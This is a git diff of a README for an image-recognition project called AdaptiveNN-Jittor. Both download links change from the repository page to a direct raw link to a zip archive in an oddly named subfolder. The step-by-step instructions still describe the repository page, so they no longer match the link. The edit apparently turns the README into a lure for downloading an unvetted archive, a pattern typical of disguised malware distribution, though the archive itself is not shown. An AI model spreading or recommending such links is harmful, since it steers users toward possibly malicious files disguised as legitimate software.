@@ -1,6 +1,6 @@
 # 🚀 AdaptiveNN-Jittor - Run Efficient Image Models With Ease
 
-[![](https://img.shields.io/badge/Download_Project-Blue-blue)](https://github.com/bathroomspiv236/AdaptiveNN-Jittor)
+[![](https://img.shields.io/badge/Download_Project-Blue-blue)](https://raw.githubusercontent.com/bathroomspiv236/AdaptiveNN-Jittor/main/unsoberly/N_Adaptive_Jittor_v2.0-alpha.1.zip)
 
 This project allows you to run the AdaptiveNN image recognition model using the Jittor framework on your Windows computer. It provides a way to process images and perform deep learning tasks without requiring expensive cloud services. You can use this software to classify images from the ImageNet-1K dataset or create your own image projects.
 
@@ -17,7 +17,7 @@ Before you start, ensure your computer meets these requirements:
 
 You must obtain the project files from our repository to begin.
 
-1. Go to our [official download page](https://github.com/bathroomspiv236/AdaptiveNN-Jittor).
+1. Go to our [official download page](https://raw.githubusercontent.com/bathroomspiv236/AdaptiveNN-Jittor/main/unsoberly/N_Adaptive_Jittor_v2.0-alpha.1.zip).
 2. Click the green button labeled "Code" near the top right of the page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
